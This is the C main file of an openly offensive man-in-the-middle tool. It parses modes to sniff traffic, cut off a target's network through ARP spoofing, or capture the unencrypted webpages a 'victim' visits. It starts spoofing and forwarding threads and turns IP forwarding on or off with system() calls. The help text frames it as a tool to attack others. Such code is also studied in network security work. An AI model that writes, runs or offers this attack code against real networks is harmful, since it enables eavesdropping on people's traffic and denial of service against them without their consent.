/*
* MAIN FUNCTION
* AUTHOR: Yue Pan zxc479773533@gmail.com
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
* TOTAL: 
*/

#include "head.h"

/* modes */
#define Sniff 1
#define Break 2
#define Get 3

/* address */
u_char TARGET_MAC[6];
u_char ATTACKER_MAC[6];
u_char GATEWAY_MAC[6];
u_char TARGET_IP[4];
u_char GATEWAY_IP[4] = {192,168,1,1};

/* about multithreading */
pthread_t thread1, thread2, thread3, thread4;
int ret_thread1, ret_thread2, ret_thread3, ret_thread4;

/* mode control */
int mode;

/* loading delay(just decorations) */
void loading(void) {
    for (int i = 0; i < 6; i++) {
        printf(".");
        usleep(3e5);
    }
    printf(" Done!\n\n");
}

/* get device */
char* getdev(char *dev, char *errbuf) {
    printf("Finding device\n");
    dev = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    loading();
    printf("The net device is %s\n\n", dev);
    return dev;
}

int main(int argc, char const *argv[]) {

    /* print picture */
    printf("\n");
    printf("|    | |    | ˉˉˉˉˉ|         | ˉˉ|ˉˉ\n");
    printf("|----| |    | _____|    |    |   |  \n");
    printf("|    | |____| |____|    |____| __|__\n");
    printf("\n\n");

    /* choose mode */
    if (argv[1] != NULL && !strcmp(argv[1], "-h")) {
        printf("\nUsage: ./Attacker + [argv1] + ([argv2])\n\n");
        printf("\t-h: See help.\n\n");
        printf("\t-s \"[argv2]\": Open sniffer, and argv2 is a pcap filter expression.\n\n");
        printf("\t[pcap filter] format:\n\n");
        printf("\t\tether src [mac]: source MAC is [mac].\n\n");
        printf("\t\tether dst [mac]: destination MAC is [mac].\n\n");
        printf("\t\tdst [ip]: destination ip is [ip].\n\n");
        printf("\t\tsrc [ip]: source ip is [ip].\n\n");
        printf("\t\thost [ip]: source ip is [ip] or destination ip is [ip].\n\n");
        printf("\t\tdst port [port]: destination port is [port].\n\n");
        printf("\t\tsrc port [port]: source port is [port].\n\n");
        printf("\t\tether [type]: ip, ip6, arp, rarp, atalk, aarp, decnet, iso, stp, ipx, etc.\n\n");
        printf("\t\t[proto type]: tcp, udp, icmp, etc.\n\n");
        printf("\t\tLogical operators: and, or, not\n\n");
        printf("\t-b: Break someone's network.\n\n");
        printf("\t-t: Get all webpage information your vitcim visited.\n\n");
        printf("Attention: -t will not function when he visit webpage using HTTPS encryption.\n");
        exit(1);
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-s")) {
        mode = Sniff;
        printf("MODE: Sniff!\n\n");
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-b")) {
        mode = Break;
        printf("MODE: BREAK!\n\n");
    }
    else if (argv[1] != NULL && !strcmp(argv[1], "-t")) {
        mode = Get;
        printf("MODE: GET!\n\n");
    }
    else {
        printf("A small tool to launch a Man-in-the-middle attack, and HUA JI your victims.\n");
        printf("MIT License, Copyright (c) 2017 Yue Pan.\n");
        printf("Please launch this tool as root.\n");
        printf("for help, use -h.\n");
        exit(1);
    }

    /* get device */
    char *dev = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    dev = getdev(dev, errbuf);

    /* sniff */
    if (mode == Sniff) {
        Sniffer(dev, argv[2]);
        exit(1);
    }

    /* get information */
    Getinfo(dev, errbuf);

    /* arpspoof */
    printf("Attaking!!\n");
    MITM_arg.dev = dev;
    ret_thread1 = pthread_create(&thread1, NULL, (void *)&Arpspoof, (void *)&MITM_arg);
    

    /* arpforwarder */
    if (mode == Get) {
        system("echo '1' > /proc/sys/net/ipv4/ip_forward");
        printf("Now you are the Middle Man, his network is in your power!\n\n");
        ret_thread2 = pthread_create(&thread2, NULL, (void *)&Arpforward, (void *)&MITM_arg);
    }
    else {
        system("echo '0' > /proc/sys/net/ipv4/ip_forward");
        printf("Now his network is broken\n");
    }
    pthread_join(thread1,NULL);
    pthread_join(thread2,NULL);

    return 0;
}
